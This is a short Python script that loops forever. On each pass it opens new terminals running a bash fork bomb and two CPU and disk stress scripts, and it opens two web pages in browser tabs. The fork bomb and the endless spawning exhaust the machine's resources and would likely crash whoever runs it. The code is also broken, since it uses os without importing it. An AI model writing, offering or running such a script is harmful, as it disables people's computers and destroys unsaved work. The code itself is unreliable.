import subprocess, webbrowser, asyncio

commands = [
  "bash Scripts/cpu.sh",
  ":(){ :|: & };:",
  "bash Scripts/disk.sh"
]

os.system(f"chmod +x Scripts/cpu.sh")
os.system(f"chmod +x Scripts/disk.sh")

async def one():
  i = 0
  while True:
    for cmd in commands:
      subprocess.Popen(["gnome-terminal", "--", "bash", "-c", cmd])
      webbrowser.open_new_tab("https://www.growden.io")
      webbrowser.open("https://webglsamples.org/aquarium/aquarium.html")
      
asyncio.run(one())